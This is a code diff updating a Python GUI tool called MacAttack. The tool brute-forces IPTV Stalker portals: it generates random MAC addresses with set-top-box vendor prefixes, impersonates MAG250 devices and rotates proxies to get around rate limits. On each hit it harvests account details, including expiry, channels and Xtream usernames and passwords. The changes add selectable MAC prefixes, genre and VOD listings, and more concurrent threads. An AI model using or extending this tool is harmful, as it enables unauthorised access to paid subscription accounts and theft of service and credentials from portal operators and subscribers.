@@ -1,6 +1,6 @@
 # TODO:
 # Clean up code, remove redundancy
-VERSION = "4.6.6"
+VERSION = "4.6.9"
 import semver
 import urllib.parse
 import webbrowser
@@ -125,7 +125,7 @@ def get_token(session, url, mac, timeout=30):
         "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
         "Accept-Encoding": "identity",
         "Accept": "*/*",
-        "Connection": "close",
+        "Connection": "keep-alive",
     }
 
     if not player_portal_type_detected:  # Check for type portal
@@ -247,7 +247,7 @@ def get_token(session, url, mac, timeout=30):
                         "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
                         "Accept-Encoding": "identity",
                         "Accept": "*/*",
-                        "Authorization": f"Bearer {token}",  # token to headers
+                        "Authorization": f"Bearer {token}", 
                         "X-Random": f"{token_random}",
                     }
                 )
@@ -651,7 +651,7 @@ class RequestThread(QThread):
                 "sn": sn,
                 "stb_lang": "en",
                 "timezone": "America/Los_Angeles",
-                "token": token,  # token to cookies
+                "token": token,
             }
 
             headers = {
@@ -659,7 +659,7 @@ class RequestThread(QThread):
                 "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) "
                 "AppleWebKit/533.3 (KHTML, like Gecko) "
                 "MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
-                "Authorization": f"Bearer {token}",  # token to headers
+                "Authorization": f"Bearer {token}", 
             }
 
             if token_random:
@@ -670,7 +670,7 @@ class RequestThread(QThread):
                     "Accept-Encoding": "identity",
                     "Accept": "*/*",
                     "Connection": "keep-alive",
-                    "Authorization": f"Bearer {token}",  # token to headers
+                    "Authorization": f"Bearer {token}",
                     "X-Random": f"{token_random}",
                 }
 
@@ -1087,6 +1087,7 @@ class MacAttack(QMainWindow):
         self.proxy_fetcher = ProxyFetcher()
         self.hourly_timer = None
         self.remaining_time = 3600
+        self.customprefix = "00:1A:79:"
         self.proxy_fetcher.update_proxy_output_signal.connect(self.update_proxy_output)
         self.proxy_fetcher.update_proxy_textbox_signal.connect(
             self.update_proxy_textbox
@@ -1787,13 +1788,12 @@ class MacAttack(QMainWindow):
         # QVBoxLayout for the Settings_frame
         layout = QVBoxLayout(Settings_frame)
 
-        # a line above the tabs
         top_line = QFrame()
         top_line.setFrameShape(QFrame.HLine)
         top_line.setFrameShadow(QFrame.Sunken)
-        layout.addWidget(top_line)  # the line above the tabs
+        layout.addWidget(top_line)
 
-        # tab widget for the settings frame
+        # Tab widget for the settings frame
         tab_widget = QTabWidget(Settings_frame)
 
         # Set a custom style to remove the rounded corners
@@ -1857,7 +1857,6 @@ class MacAttack(QMainWindow):
         self.autostop_checkbox = QCheckBox("Stop the attack.")
         macfound_checkboxes.addWidget(self.autostop_checkbox)
 
-        # the horizontal layout to the main general_layout
         general_layout.addLayout(macfound_checkboxes)
 
         general_layout.addSpacing(20)
@@ -1991,15 +1990,13 @@ class MacAttack(QMainWindow):
         self.dont_update_checkbox = QCheckBox("Don't check for updates.")
         system_settings_checkboxes.addWidget(self.dont_update_checkbox)
 
-        # the horizontal layout to the main general_layout
+        # Horizontal layout to the main general_layout
         general_layout.addLayout(system_settings_checkboxes)
 
-        # the tabs to the tab widget
         tab_widget.addTab(general_tab, "General")
         tab_widget.addTab(output_tab, "Output")
         tab_widget.addTab(videoplayer_tab, "Video Player")
 
-        # the tab widget to the main layout
         layout.addWidget(tab_widget)
 
         # OUTPUT TAB
@@ -2011,13 +2008,13 @@ class MacAttack(QMainWindow):
         line2.setFrameShadow(QFrame.Sunken)
         output_layout.addWidget(line2)
 
-        # a horizontal layout for the label and spinbox
+        # Horizontal layout for the label and spinbox
         buffer_layout = QHBoxLayout()
         buffer_layout.setAlignment(
             Qt.AlignLeft
         )  # Align the layout contents to the left
 
-        # widget to apply background color
+        # A widget to apply background color
         buffer_widget = QWidget()
         buffer_widget.setLayout(buffer_layout)
         buffer_widget.setStyleSheet("background-color: green;")
@@ -2035,14 +2032,14 @@ class MacAttack(QMainWindow):
 
         output_layout.addWidget(
             buffer_widget
-        )  # the widget with the background color to the output_layout
+        )
 
         output_layout.addItem(
             QSpacerItem(0, 20, QSizePolicy.Minimum, QSizePolicy.Fixed)
         )  # 20px spacer
 
-        # label for "Add to output:"
-        output_checkbox_width = 250  # Set width of checkboxes
+        # Add to output:" Label
+        output_checkbox_width = 260  # Set width of checkboxes
         add_to_output_label = QLabel("Add to output:")
         output_layout.addWidget(add_to_output_label)
 
@@ -2099,21 +2096,17 @@ class MacAttack(QMainWindow):
         self.proxy_used_output_checkbox = QCheckBox("Proxy Used")
         self.proxy_used_output_checkbox.setFixedWidth(output_checkbox_width)
 
-        # checkbox for something later, next to proxy info
+        # Checkbox for Proxy Location
         self.proxy_location_output_checkbox = QCheckBox(
             "Proxy Location (Proxy Used Req'd)"
         )
         self.proxy_location_output_checkbox.setFixedWidth(output_checkbox_width)
 
-        # horizontal layout to both checkboxes side by side
         proxy_layout = QHBoxLayout()
         proxy_layout.addWidget(self.proxy_used_output_checkbox)
         proxy_layout.addWidget(self.proxy_location_output_checkbox)
-
-        # Set alignment for the new horizontal layout
         proxy_layout.setAlignment(Qt.AlignLeft)
-
-        # the new horizontal layout to the main output layout
+        
         output_layout.addLayout(proxy_layout)
 
         # Date Found with Date Created (side by side)
@@ -2126,6 +2119,24 @@ class MacAttack(QMainWindow):
         # Set alignment for horizontal layout
         horizontal_layout_4.setAlignment(Qt.AlignLeft)
         output_layout.addLayout(horizontal_layout_4)
+
+        # Layout for Playlist/Genres and VOD List checkboxes
+        playlist_genres_layout = QHBoxLayout()
+        playlist_genres_layout.setAlignment(Qt.AlignLeft)
+
+        # Playlist/Genres checkbox
+        self.list_genres_checkbox = QCheckBox("Playlist/Genres")
+        self.list_genres_checkbox.setFixedWidth(output_checkbox_width)
+
+        # VOD List checkbox
+        self.vod_list_checkbox = QCheckBox("VOD Categories")
+        self.vod_list_checkbox.setFixedWidth(output_checkbox_width)
+
+        playlist_genres_layout.addWidget(self.list_genres_checkbox)
+        playlist_genres_layout.addWidget(self.vod_list_checkbox)
+
+        output_layout.addLayout(playlist_genres_layout)
+
 
         output_layout.addItem(
             QSpacerItem(0, 20, QSizePolicy.Minimum, QSizePolicy.Fixed)
@@ -2153,7 +2164,7 @@ class MacAttack(QMainWindow):
         self.autopause_checkbox = QCheckBox("Pause the video when switching tabs")
         videoplayer_layout.addWidget(self.autopause_checkbox)
         videoplayer_layout.addSpacing(50)  # space before tips
-        # the "Tips" label
+        # "Tips" label
         tips_label = QLabel("Tips")
         tips_label.setAlignment(Qt.AlignTop)
         videoplayer_layout.addWidget(tips_label)
@@ -2162,7 +2173,7 @@ class MacAttack(QMainWindow):
         line4.setFrameShape(QFrame.HLine)
         line4.setFrameShadow(QFrame.Sunken)
         videoplayer_layout.addWidget(line4)
-        # the list of tips
+        # The list of tips
         tips_text = QLabel(
             "<b>Video Controls:</b><br>"
             "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mouseclick/Space Bar - Toggle Pause<br>"
@@ -2171,7 +2182,6 @@ class MacAttack(QMainWindow):
         )
         tips_text.setAlignment(Qt.AlignTop)
         videoplayer_layout.addWidget(tips_text)
-        # the tabs to the tab widget
         tab_widget.addTab(general_tab, "General")
         tab_widget.addTab(output_tab, "Output")
         tab_widget.addTab(videoplayer_tab, "VideoPlayer")
@@ -2179,7 +2189,6 @@ class MacAttack(QMainWindow):
         tab_line = QFrame()
         tab_line.setFrameShape(QFrame.HLine)
         tab_line.setFrameShadow(QFrame.Sunken)
-        # the tab widget to the layout
         layout.addWidget(tab_widget)
         # Set the main layout
         Settings_frame.setLayout(layout)
@@ -2201,7 +2210,6 @@ class MacAttack(QMainWindow):
         version_label.setStyleSheet("font-size: 10px; color: gray;")
         bottom_layout.addWidget(version_label, alignment=Qt.AlignRight)
 
-        # the horizontal layout to the Settings_frame layout
         layout.addLayout(bottom_layout)
 
     def on_save_pool_clicked(self):
@@ -2514,6 +2522,35 @@ class MacAttack(QMainWindow):
         )  # Connect signal to function
         dropdown_label_layout.addWidget(self.dropdown_box, alignment=Qt.AlignLeft)
 
+        dropdown_label_layout.addItem(QSpacerItem(20, 0))  # 10px vertical space
+
+        # Prefix dropdown and label
+        self.prefix_label = QLabel("Prefix:")
+        dropdown_label_layout.addWidget(self.prefix_label)
+
+        self.prefix_dropdown = QComboBox()
+        prefixes = sorted([
+            'D4:CF:F9:',
+            '33:44:CF:',
+            '10:27:BE:',
+            'A0:BB:3E:',
+            '55:93:EA:',
+            '04:D6:AA:',
+            '11:33:01:',
+            '00:1C:19:',
+            '1A:00:6A:',
+            '1A:00:FB:',
+            '00:A1:79:',
+            '00:1B:79:',
+            '00:2A:79:',
+            '00:1A:79: (default)'
+        ])
+        self.prefix_dropdown.addItems(prefixes)
+        dropdown_label_layout.addWidget(self.prefix_dropdown)
+        self.prefix_dropdown.currentIndexChanged.connect(self.update_customprefix)
+
+
+
         # Center spacer for label alignment
         center_spacer = QSpacerItem(0, 0, QSizePolicy.Expanding, QSizePolicy.Minimum)
         dropdown_label_layout.addItem(center_spacer)
@@ -2541,7 +2578,7 @@ class MacAttack(QMainWindow):
         )
         self.output_text.setPlainText("Output LOG:\nResults will appear here.\n")
         self.output_text.setReadOnly(True)
-        monospace_font = QFont("Lucida Console", 10)
+        monospace_font = QFont("Cascadia Mono", 10)
         self.output_text.setFont(monospace_font)
         layout.addWidget(self.output_text)
 
@@ -2586,6 +2623,14 @@ class MacAttack(QMainWindow):
         self.error_text.setFont(monospace_font)
         layout.addWidget(self.error_text)
         layout.addSpacing(15)  # Adds space
+
+
+    def update_customprefix(self):
+        # Update self.customprefix with the currently selected prefix
+        self.customprefix = self.prefix_dropdown.currentText()
+        self.customprefix = self.customprefix.replace(' (default)', '') #remove default
+        print(f"Updated customprefix: {self.customprefix}")
+
 
     def set_portal_type_detected(self, index):
         global portaltype
@@ -2704,13 +2749,14 @@ class MacAttack(QMainWindow):
             self.proxy_location_output_checkbox.setChecked(False)
             self.singleoutputfile_checkbox.setChecked(True)
             self.proxy_location_output_checkbox.setChecked(False)
-            # self.proxy_concurrent_tests.setValue(100)
             self.proxy_remove_errorcount.setValue(5)
             self.proxy_input.setText("")
             self.output_buffer_spinbox.setValue(2500)
             self.dont_update_checkbox.setChecked(False)
             self.use_custom_macs_checkbox.setChecked(False)
             self.update_hourly_checkbox.setChecked(False)
+            self.list_genres_checkbox.setChecked(False)
+            self.vod_list_checkbox.setChecked(False)
             self.remove_for_seconds_spinbox.setValue(30)
 
             logging.debug("UI reset to default values.")
@@ -2773,6 +2819,8 @@ class MacAttack(QMainWindow):
             ),
             "use_custom_macs": str(self.use_custom_macs_checkbox.isChecked()),
             "ratelimit_timeout": str(self.remove_for_seconds_spinbox.value()),
+            "list_genres": str(self.list_genres_checkbox.isChecked()),
+            "list_vod": str(self.vod_list_checkbox.isChecked()),
         }
         config["Window"] = {
             "width": self.width(),
@@ -2839,7 +2887,6 @@ class MacAttack(QMainWindow):
             self.deviceid_output_checkbox.setChecked(
                 config.get("Settings", "deviceid_output", fallback="False") == "True"
             )
-            # Load output_tab checkboxes
             self.ip_address_output_checkbox.setChecked(
                 config.get("Settings", "ip_address_output", fallback="False") == "True"
             )
@@ -2876,9 +2923,7 @@ class MacAttack(QMainWindow):
             self.proxy_textbox.setPlainText(
                 config.get("Settings", "proxy_list", fallback="")
             )
-            # self.proxy_concurrent_tests.setValue(
-            #    config.getint("Settings", "proxy_concurrent_tests", fallback=100)
-            # )
+
             self.proxy_remove_errorcount.setValue(
                 config.getint("Settings", "proxy_remove_errorcount", fallback=5)
             )
@@ -2900,13 +2945,13 @@ class MacAttack(QMainWindow):
                 config.getint("Settings", "ratelimit_timeout", fallback=30)
             )
 
-            #            self.custom_macs_textbox.setPlainText(
-            #                config.get("Settings", "custom_macs_text", fallback="")
-            #            )
-            #            # Load the restore checkbox state
-            #            self.restore_custom_macs_checkbox.setChecked(
-            #                config.get("Settings", "restore_custom_macs", fallback="False") == "True"
-            #            )
+            self.list_genres_checkbox.setChecked(
+                config.get("Settings", "list_genres", fallback="False") == "True"
+            )
+            self.vod_list_checkbox.setChecked(
+                config.get("Settings", "list_vod", fallback="False") == "True"
+            )
+
             # Load window geometry
             if config.has_section("Window"):
                 self.resize(
@@ -2992,24 +3037,25 @@ class MacAttack(QMainWindow):
             self.update_error_text_signal.emit("Error: No Hostname")
             return False
 
-        # Check if its reachable
-        try:
-            with no_proxy_environment():  # Bypass the environment proxy set in the video player tab
-                response = requests.head(url, timeout=15)
-            if response.ok:  # Check if we get any response
-                self.update_error_text_signal.emit(
-                    "Received valid response from the link, proceeding..."
-                )
-                return True
-            else:
-                logging.debug(f"Status Code: {response.status_code}")
-                self.update_error_text_signal.emit("Error: Invalid response from server.")
-                return False
-
-        except requests.RequestException as e:
-            logging.debug(f"Request failed: {str(e)}")
-            self.update_error_text_signal.emit(f"Error: {str(e)}")
-            return False
+#        # Check if its reachable
+#        try:
+#            with no_proxy_environment():  # Bypass the environment proxy set in the video player tab
+#                response = requests.head(url, timeout=15)
+#            if response.ok:  # Check if we get any response
+#                self.update_error_text_signal.emit(
+#                    "Received valid response from the link, proceeding..."
+#                )
+#                return True
+#            else:
+#                logging.debug(f"Status Code: {response.status_code}")
+#                self.update_error_text_signal.emit("Error: Invalid response from server.")
+#                return False
+#
+#        except requests.RequestException as e:
+#            logging.debug(f"Request failed: {str(e)}")
+#            self.update_error_text_signal.emit(f"Error: {str(e)}")
+#            return False
+        return True
 
 
     def _create_threads(self):
@@ -3021,7 +3067,7 @@ class MacAttack(QMainWindow):
 
         self.parsed_url = urlparse(self.iptv_link)
         self.parsed_path = self.parsed_url.path
-        logging.debug(self.parsed_path)
+        #logging.debug(self.parsed_path)
         # remove the c/ from the path
         if self.parsed_path.endswith("c"):
             self.parsed_path = self.parsed_path[:-1]
@@ -3061,10 +3107,11 @@ class MacAttack(QMainWindow):
 
         if not portal_type_detected:  # Check for type portal
             version_url = f"{self.base_url}/c/version.js"
+            logging.debug(f"Version URL: {version_url}")
             try:
                 with no_proxy_environment():  # Bypass the enviroment proxy set in the video player tab
                     response = requests.get(
-                        version_url, headers=headers
+                        version_url, headers=headers, timeout=10
                     )  # Add headers here
                     response.raise_for_status()  # Raise an exception for HTTP errors
 
@@ -3088,9 +3135,10 @@ class MacAttack(QMainWindow):
 
         if not portal_type_detected:  # check for type stalker_portal
             version_url = f"{self.base_url}/stalker_portal/c/version.js"
+            logging.debug(f"Version URL: {version_url}")
             try:
                 response = requests.get(
-                    version_url, headers=headers
+                    version_url, headers=headers, timeout=10
                 )  # Add headers here
                 response.raise_for_status()  # Raise an exception for HTTP errors
 
@@ -3149,7 +3197,7 @@ class MacAttack(QMainWindow):
                 num_tests = 1 + (num_tests - 1) * (max_value - 1) / (1800 - 1)
                 num_tests = int(num_tests)
         else:
-            max_value = 100
+            max_value = 300
             num_tests = 1 + (num_tests - 1) * (max_value - 1) / (100 - 1)
             num_tests = int(num_tests)
         # Start threads to test MACs
@@ -3222,8 +3270,11 @@ class MacAttack(QMainWindow):
         backend_ip_address = None
         self.recentlyfound = []  # Erase recently found list
         iptv_url = self.iptv_link
+        base_url = self.base_url
 
         while self.running:  # Loop will continue as long as self.running is True
+
+
 
             # Checkbox states
             include_date_found = self.datefound_output_checkbox.isChecked()
@@ -3236,11 +3287,13 @@ class MacAttack(QMainWindow):
             include_date_created = self.date_created_output_checkbox.isChecked()
             include_proxy_used = self.proxy_used_output_checkbox.isChecked()
             include_proxy_location = self.proxy_location_output_checkbox.isChecked()
-
+            ratelimit_timeout = self.remove_for_seconds_spinbox.value()
+            include_genres = self.list_genres_checkbox.isChecked()
+            include_vod = self.vod_list_checkbox.isChecked()
             custommacs = (
                 self.use_custom_macs_checkbox.isChecked()
             )  # Check the state of the checkbox
-
+            Ludicrous_speed = self.ludicrous_speed_checkbox.isChecked()
             if custommacs:
                 self.macattack_update_mac_count_signal.emit()
                 self.nomacs = 0
@@ -3266,7 +3319,8 @@ class MacAttack(QMainWindow):
             else:
                 selected_proxy = "Your Connection"
 
-            mac = self.RandomMacGenerator()  # Generate a random MAC
+            #mac = self.RandomMacGenerator()  # Generate a random MAC
+            mac = self.RandomMacGenerator(prefix=self.customprefix) # Generate a random MAC with a prefix
             if mac == "":
                 # Show error message
                 self.update_error_text_signal.emit("<b>Custom MACs list is empty</b>")
@@ -3318,7 +3372,7 @@ class MacAttack(QMainWindow):
                         }
                     )
 
-                    url = f"{self.base_url}{portaltype}?action=handshake&type=stb&JsHttpRequest=1-xml"
+                    url = f"{base_url}{portaltype}?action=handshake&type=stb&JsHttpRequest=1-xml"
 
                     logging.debug(f"Getting URL {url}")
 
@@ -3329,8 +3383,8 @@ class MacAttack(QMainWindow):
                     res = macattacksess.get(url, timeout=timeout)
 
                     logging.debug(f"Status Code: {res.status_code}")
-                    if res.status_code == 404:
-                        logging.debug("404") # Nothing to do about this, as some portals return 404 on failed login.
+                    #if res.status_code == 404:
+                    #    logging.debug("404") # Nothing to do about this, as some portals return 404 on failed login.
 
                     if custommacs:
                         if (
@@ -3352,11 +3406,14 @@ class MacAttack(QMainWindow):
                                             mac
                                         )  # Remove the specific MAC address
                                         logging.debug(f"removeing {mac} from deque")
-
                             else:
                                 # Handle the case when the deque is empty
                                 logging.info("Pool is empty, cannot pop anything.")
-
+                        if self.prefer_speed_radio.isChecked():
+                            if self.mac_dict:
+                                self.mac_dict.remove(
+                                    mac
+                                )  # Remove the specific MAC address                            
                     logging.info(f"Response Text: {res.text}")
                     logging.debug(f"Response Headers: {res.headers}")
                     token = None
@@ -3415,7 +3472,7 @@ class MacAttack(QMainWindow):
                                 "Accept-Encoding": "identity",
                                 "Accept": "*/*",
                                 "Connection": "keep-alive",
-                                "Authorization": f"Bearer {token}",  # token to headers
+                                "Authorization": f"Bearer {token}",
                                 "X-Random": f"{token_random}",
                             }
                         )
@@ -3434,7 +3491,7 @@ class MacAttack(QMainWindow):
                             }
                         )
 
-                        url1_a = f"{self.base_url}{portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: {self.portal_version}; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp={round(time.time())}&api_sig=262&prehash=0"
+                        url1_a = f"{base_url}{portaltype}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: {self.portal_version}; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={metrics}&hw_version_2={hw_version_2}&timestamp={round(time.time())}&api_sig=262&prehash=0"
                         # Activate the portal by getting the profile with the correct headers cookies and id's
                         res1_a = macattacksess.get(url1_a)
                         logging.debug(res1_a.text)
@@ -3448,7 +3505,7 @@ class MacAttack(QMainWindow):
                             if "js" in data and "expire_billing_date" in data["js"]:
                                 exp_billing = data["js"]["expire_billing_date"]
 
-                        url2 = f"{self.base_url}{portaltype}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
+                        url2 = f"{base_url}{portaltype}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
 
                         res2 = macattacksess.get(
                             url2, timeout=timeout, allow_redirects=False
@@ -3491,7 +3548,7 @@ class MacAttack(QMainWindow):
 
                                 logging.debug(expiry)
 
-                                url3 = f"{self.base_url}{portaltype}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
+                                url3 = f"{base_url}{portaltype}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
                                 res3 = macattacksess.get(
                                     url3,
                                     timeout=timeout,
@@ -3500,7 +3557,7 @@ class MacAttack(QMainWindow):
                                 count = 0
                                 if res3.status_code == 200:
 
-                                    url4 = f"{self.base_url}{portaltype}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
+                                    url4 = f"{base_url}{portaltype}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
                                     res4 = macattacksess.get(
                                         url4,
                                         timeout=timeout,
@@ -3566,7 +3623,7 @@ class MacAttack(QMainWindow):
                                         logging.debug(f"Failed to parse JSON: {e}")
                                         userfound = 0
                                     if userfound == 1:
-                                        xtream_url = f"{self.base_url}/player_api.php?username={username}&password={password}"
+                                        xtream_url = f"{base_url}/player_api.php?username={username}&password={password}"
                                         resxtream = macattacksess.get(
                                             xtream_url,
                                             timeout=timeout,
@@ -3708,7 +3765,7 @@ class MacAttack(QMainWindow):
                                             return {"error": str(e)}
 
                                     # Resolve middleware IP address
-                                    parsed_middleware = urlparse(self.base_url)
+                                    parsed_middleware = urlparse(base_url)
                                     middleware_hostname = parsed_middleware.hostname
 
                                     if include_ip_addresses:
@@ -3805,6 +3862,120 @@ class MacAttack(QMainWindow):
                                             if backend_location
                                             else ""
                                         )
+
+                                    if include_genres: # OK, I made this way too stupid(and it hurt my brain), but it works, and I like it!
+                                        title_max_length = 20 # Cut off end of titles afther this many chars
+                                        title_columns = 4
+                                        titles_str = None
+                                        titles_grid = None
+                                        genres_url = f"{base_url}{portaltype}?type=itv&action=get_genres&JsHttpRequest=1-xml"
+                                        res_genres = macattacksess.get(genres_url)
+                                        
+                                        if res_genres.text:
+                                            def modify_title(title, title_max_length):
+                                                title = re.sub(r'[^\x00-\x7F]+', ' ', title) # Remove non-ASCII characters so the blocks touch eachother
+                                                title = re.sub(r'\|(?!\s)', '', title) # Remove pipes not followed by a space
+                                                # Pad the title with blank spaces if it's shorter than title_max_length
+                                                if len(title) < title_max_length:
+                                                    title = title + ' ' * (title_max_length - len(title))
+                                                
+                                                title = title + "▐"
+                                                
+                                                return title
+
+                                            data = json.loads(res_genres.text)
+                                            data['js'] = [genre for genre in data['js'] if genre['id'] != "*"] # Remove the "ALL" title
+                                            # Store the original genres in orig_genres
+                                            orig_genres = ', '.join(genre['title'] for genre in data['js'])
+                                            
+                                            # Modify the titles as needed for further processing
+                                            titles = [modify_title(genre['title'], title_max_length) for genre in data['js']]
+                                            titles_str = ', '.join(titles)
+                                            
+                                            titles_list = titles_str.split(", ")
+
+                                            formatted_titles = []
+                                            for title in titles_list:
+                                                # Clean and truncate each title if longer than title_max_length
+                                                truncated_title = modify_title(title[:title_max_length].rstrip(), title_max_length)
+                                                formatted_titles.append(truncated_title)
+
+                                            rows = [formatted_titles[i:i + title_columns] for i in range(0, len(formatted_titles), title_columns)]
+                                            
+                                            if len(rows[-1]) < title_columns:
+                                                rows[-1] += [''] * (title_columns - len(rows[-1]))
+
+                                            def format_row(row, idx, title_max_length):
+                                                formatted_titles = " ".join(title.ljust(title_max_length) for title in row)
+                                                if idx == 0:
+                                                    return "▌ " + formatted_titles
+                                                else:
+                                                    return f"{'':<11}▌ " + formatted_titles 
+
+                                            def generate_titles_grid(rows, title_max_length):
+                                                return "\n".join(format_row(row, idx, title_max_length) for idx, row in enumerate(rows))
+
+                                            titles_grid = generate_titles_grid(rows, title_max_length)
+                                            
+                                            logging.debug(f"Original Genres: {orig_genres}")
+                                            logging.debug(f"Formatted Titles Grid:\n{titles_grid}")
+                                    if include_vod:
+                                        title_max_length = 20 # Cut off end of titles afther this many chars
+                                        title_columns = 4
+                                        vod_str = None
+                                        vod_grid = None
+                                        vod_url = f"{base_url}{portaltype}?type=vod&action=get_categories&JsHttpRequest=1-xml"
+                                        res_vod = macattacksess.get(vod_url)
+                                        
+                                        if res_vod.text:
+                                            def modify_vod(title, title_max_length):
+                                                #title = re.sub(r'[^\x00-\x7F]+', ' ', title) # Remove non-ASCII characters so the blocks touch eachother
+                                                title = re.sub(r'\|(?!\s)', '', title) # Remove pipes not followed by a space
+                                                
+                                                # Pad the title with blank spaces if it's shorter than title_max_length
+                                                if len(title) < title_max_length:
+                                                    title = title + ' ' * (title_max_length - len(title))
+                                                
+                                                title = title + "▐"
+                                                
+                                                return title
+
+                                            data = json.loads(res_vod.text)
+                                            data['js'] = [genre for genre in data['js'] if genre['id'] != "*"] # Remove the "ALL" title
+                                            # Store the original genres in orig_genres
+                                            orig_vods = ', '.join(genre['title'] for genre in data['js'])
+                                            
+                                            # Modify the titles as needed for further processing
+                                            titles = [modify_vod(genre['title'], title_max_length) for genre in data['js']]
+                                            vod_str = ', '.join(titles)
+                                            
+                                            vod_list = vod_str.split(", ")
+
+                                            formatted_titles = []
+                                            for title in vod_list:
+                                                # Clean and truncate each title if longer than title_max_length
+                                                truncated_title = modify_vod(title[:title_max_length].rstrip(), title_max_length)
+                                                formatted_titles.append(truncated_title)
+
+                                            rows = [formatted_titles[i:i + title_columns] for i in range(0, len(formatted_titles), title_columns)]
+                                            
+                                            if len(rows[-1]) < title_columns:
+                                                rows[-1] += [''] * (title_columns - len(rows[-1]))
+
+                                            def format_row(row, idx, title_max_length):
+                                                formatted_titles = " ".join(title.ljust(title_max_length) for title in row)
+                                                if idx == 0:
+                                                    return "▌ " + formatted_titles
+                                                else:
+                                                    return f"{'':<11}▌ " + formatted_titles 
+
+                                            def generate_titles_grid(rows, title_max_length):
+                                                return "\n".join(format_row(row, idx, title_max_length) for idx, row in enumerate(rows))
+
+                                            vods_grid = generate_titles_grid(rows, title_max_length)
+                                            
+                                            logging.debug(f"Original Genres: {orig_vods}")
+                                            logging.debug(f"Formatted Titles Grid:\n{vods_grid}")
 
                                     result_message = (
                                         f"{'Portal  :':<10} {iptv_url}\n"
@@ -3918,16 +4089,30 @@ class MacAttack(QMainWindow):
 
                                     result_message += f"{'Exp date:':<10} {expiry}\n{'Channels:':<10} {count}\n"
 
+
+                                    if include_genres and titles_str:
+                                        result_message += f"{'Playlist:':<10} {titles_grid}\n"
+                                        
+                                        
+                                    if include_vod and vod_str:
+                                        result_message += f"{'VOD list:':<10} {vods_grid}\n"
+                                        
+
+
+
                                     if not mac in self.recentlyfound:
                                         self.add_recently_found(
                                             mac
-                                        )  # it to the recently found list
-                                        # Emit the result message to the output signal
+                                        )
                                         self.update_output_text_signal.emit(
                                             result_message
                                         )
 
-                                        # Write to file with a single blank line after each output
+                                        # Replace the grid with the list for the file
+                                        if include_genres and titles_str and titles_grid:
+                                            result_message = result_message.replace(titles_grid, orig_genres)
+                                            result_message = result_message.replace(vods_grid, orig_vods)
+                                            logging.debug("Replacing playlist grid with list for file")
                                         self.output_file.write(result_message + "\n")
                                         self.output_file.flush()
 
@@ -3951,6 +4136,10 @@ class MacAttack(QMainWindow):
                                 logging.info(f"No JSON response for MAC {mac}")
                                 self.proxy_error_counts[selected_proxy] = 0
                                 self.proxy_error_connect_counts[selected_proxy] = 0
+                if selected_proxy in self.proxy_error_counts:
+                    del self.proxy_error_counts[selected_proxy]
+                if selected_proxy in self.proxy_error_connect_counts:
+                    del self.proxy_error_connect_counts[selected_proxy]            
             # Try failed because data was non json
             except (
                 json.decoder.JSONDecodeError,
@@ -4174,17 +4363,23 @@ class MacAttack(QMainWindow):
                         or "Gateway Timeout" in res.text
                         or "i/o timeout" in res.text
                     ):
-                        # Track error count for the proxy
-                        if selected_proxy not in self.proxy_error_counts:
-                            self.proxy_error_counts[selected_proxy] = 1
+                        if self.proxy_enabled_checkbox.isChecked():
+                            
+                            # Track error count for the proxy
+                            if selected_proxy not in self.proxy_error_counts:
+                                self.proxy_error_counts[selected_proxy] = 1
+                            else:
+                                self.proxy_error_counts[selected_proxy] += 1
+                            self.update_error_text_signal.emit(
+                                f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>504 Gateway Time-out</b> Proxy timed out"
+                            )
+                            self.remove_proxy(
+                                selected_proxy, self.proxy_error_counts
+                            )  # remove the proxy if it exceeds the allowed error count
                         else:
-                            self.proxy_error_counts[selected_proxy] += 1
-                        self.update_error_text_signal.emit(
-                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>504 Gateway Time-out</b> Proxy timed out"
-                        )
-                        self.remove_proxy(
-                            selected_proxy, self.proxy_error_counts
-                        )  # remove the proxy if it exceeds the allowed error count
+                            self.update_error_text_signal.emit(
+                                f"Error: <b>504 Gateway Time-out</b>"
+                            )
                     elif "504 DNS look up failed" in res.text:
                         # Track error count for the proxy
                         if selected_proxy not in self.proxy_error_counts:
@@ -4311,7 +4506,7 @@ class MacAttack(QMainWindow):
                         else:
                             self.proxy_error_counts[selected_proxy] += 1
                         self.update_error_text_signal.emit(
-                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Not connecting</b> Proxy not connecting to server, failures: {self.proxy_error_counts[selected_proxy]}"
+                            f"Error {self.proxy_error_counts[selected_proxy]} for Proxy: {selected_proxy} : <b>Not connecting</b> Proxy not connecting to server"
                         )
                         # Attempt to remove the proxy if it exceeds the allowed error count
                         self.remove_proxy(selected_proxy, self.proxy_error_counts)
@@ -4365,34 +4560,44 @@ class MacAttack(QMainWindow):
                         else:
                             self.proxy_error_connect_counts[selected_proxy] += 1
                         if (
